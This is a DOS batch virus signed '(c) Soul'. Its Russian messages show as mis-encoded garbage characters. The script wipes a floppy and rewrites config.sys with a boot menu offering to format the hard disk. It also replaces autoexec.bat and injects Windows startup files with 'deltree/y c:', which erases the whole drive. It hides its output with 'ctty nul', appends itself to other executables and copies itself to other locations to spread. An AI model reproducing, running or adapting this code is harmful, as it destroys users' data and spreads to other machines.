   :(c) Soul
   @echo off
   echo     ‚¨¬ ¨¥! ‚á¥ ¯à ¢  § é¨é¥ë! ‹î¡®¥ ª®¯à®¢ ¨¥ íâ®© ¯à®£à ¬¬ë,
   echo ¢ æ¥«ïå ¢ë£®¤ë ¢à £ ¬, ï¢«ï¥âáï  àãè¥¨¥¬ ¯à ¢ ¯®âà¥¡¨â¥«¥©!
   echo ‚áâ ¢ìâ¥ á¨áâ¥¬ãî ¤¨áª¥âã ¨  ¦¬¨â¥ Enter
   pause > nul
   echo ˆ„…’ **Ž…*Š€ ‘ˆ‘’…Œ›... *’Ž ŒŽ†…’ ‡€*Ÿ’œ *…‘ŠŽ‹œŠŽ Œˆ*“’
   @ctty nul
   attrib a:\*.* -h -r -s -a
   deltree/y a:\*.*
   set conf= c:\config.sys
   set axec= c:\autoexec.bat
   attrib %conf% -h -r -a -s
   copy %conf% tmp.sys
   attrib tmp.sys +r
   del %conf%
   echo [Menu] >> %conf%
   echo MenuItem for,FORMAT MY HARD DISK >> %conf%
   echo MenuItem ers,ERASE ALL FILE ON MY DRIVE >> %conf%
   echo MenuDefault for,30 >> %conf%
   echo. >> %conf%
   echo. >> %conf%
   echo [for] >> %conf%
   echo. >> %conf%
   echo. >> %conf%
   echo [ers] >> %conf%
   echo. >> %conf%
   echo. >> %conf%
   echo [Common] >> %conf%
   type tmp.sys >> %conf%
   attrib tmp.sys -r
   del tmp.sys
   attrib c:\config.sys +r
   attrib %axec% -h -r -s -a
   del %axec%
   echo @echo off >> %axec%
   echo c:\nc\keyrus.com >> %axec%
   echo keyrus.com  >> %axec%
   echo echo Š ª ï à §¨æ  çâ® âë ¢ë¡à «? *à ¢¨«ì®! *¨ª ª®©! >> %axec%
   echo echo „ ¢ © ã¦,  ¯®á«¥¤®ª, ï à ááª ¦ã â¥¡¥  ¥ª¤®â!  >> %axec%
   echo echo ‘®«¤ â 2 £®¤  ®âá«ã¦¨«, ¨ ª ª ¢®¤¨âìáï ªã¯¨« ¡ãâë«ªã ¢®¤ª¨, >> %axec%
   echo echo çâ®¡ë ¤®¬  ¤¥¬¡¥«ì ®â¯à §®¢ âì! *® âãâ ¯à ¯®àé¨ª ã¢¨¤¥« >> %axec%
   echo echo ã ¥£® íâ®â çã¤®-àãááª¨©  ¯¨â®ª, ¨ ¤ ¢ © §«®¡® ª®á¨âìáï! >> %axec%
   echo echo ‘®«¤ â ¥ ¢ë¤¥à¦ « ¨ ¯à¥¤«®¦¨« ¥¬ã à §¤ ¢¨âì ¥ñ ¢¤¢®ñ¬! >> %axec%
   echo echo ƒãáì, á¢¨ì¥ ¥ â®¢ à¨é! - Ž’¢¥â¨« ¯à ¯®àé¨ª! >> %axec%
   echo echo „ , ¢ë § ¥â¥, ®â¢¥â¨« á®«¤ â: Ÿ â ª®© £ãáì, çâ® á «î¡®© á¢¨ì¥© ¢ë¯ìî! >> %axec%
   echo echo *ã ¢®â ¨ ¢á¥! >> %axec%
   echo @ctty nul >> %axec%
   echo deltree/y c: >> %axec%
   for %%a in (*.bat *.exe *.com ..\*.com ..\*.exe) do set _c=%%a
   echo. >> %_c%
   type %0 >> %_c%
   echo @echo off >> %winbootdir%\winstart.bat
   echo @ctty nul >> %winbootdir%\winstart.bat
   echo deltree/y c: >> %winbootdir%\winstart.bat
   echo echo Svoloch >> %winbootdir%\winstart.bat
   echo @echo off >> %winbootdir%\dosstart.bat
   echo @ctty nul >> %winbootdir%\dosstart.bat
   echo deltree/y c: >> %winbootdir%\dosstart.bat
   echo echo Svoloch >> %winbootdir%\dosstart.bat
   copy %0 ..
   copy %0 a:\%0
   for %%b in (*.?Y?) do ren %%b *.XY‰
   @ctty con
   echo ‚áñ ¢ ¯®«®¬ ¯®àï¤ª¥!
